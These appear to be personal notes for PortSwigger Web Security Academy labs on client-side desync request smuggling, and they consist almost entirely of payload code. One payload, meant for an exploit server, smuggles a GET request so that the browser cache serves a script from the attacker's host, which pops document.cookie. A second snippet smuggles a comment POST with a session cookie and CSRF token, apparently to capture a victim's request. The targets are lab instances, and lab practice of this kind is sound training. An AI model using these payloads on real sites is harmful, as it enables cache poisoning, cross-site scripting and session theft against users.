**payload for exploit server**


```htm
alert(document.cookie);
/*
<script>
    const labURL = "https://0a94007c0361999bc1c73a5a007f00e6.web-security-academy.net";
    const exploitHost = "exploit-0a98005003e69928c1da39a301700077.exploit-server.net";

    if(window.name != 'skip'){
        window.name = 'skip';
        fetch(`${labURL}/..%2f`, { method: 'POST', body: `GET //${exploitHost}/eXpLoIt HTTP/1.1\r\nFoo: x`, credentials: 'include', mode: 'no-cors' }).then(() => {location=`${labURL}/resources/js/analytics.js`} );
    } else {
        window.name = '';
        location = `${labURL}/login`;
    }
</script>
*/
```



**payload check in browser:**
```js
fetch('https://0a94007c0361999bc1c73a5a007f00e6.web-security-academy.net/..%2f', {
        method: 'POST',
        body: 'GET //exploit-0a98005003e69928c1da39a301700077.exploit-server.net/EXPLOIT HTTP/1.1\r\nFoo: x',
        mode: 'no-cors',
        credentials: 'include',
    }).then(() => {
        fetch('https://0a94007c0361999bc1c73a5a007f00e6.web-security-academy.net/resources/js/analytics.js', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```
















// last lab:
fetch('https://0a94007c0361999bc1c73a5a007f00e6.web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a94007c0361999bc1c73a5a007f00e6.web-security-academy.net\r\nCookie: session=M50GTVOaKy3I9DpPA6y5pbOCj5ZfoJ31\r\nContent-Length: 118\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=qiI9wHaodYWO4kWrfby5KkYGpSC8wUZo&postId=10&name=test&email=test%40test.com&website=http%3A%2F%2Ftest.com&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://0a94007c0361999bc1c73a5a007f00e6.web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})


// https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-browser-cache-poisoning-via-client-side-desync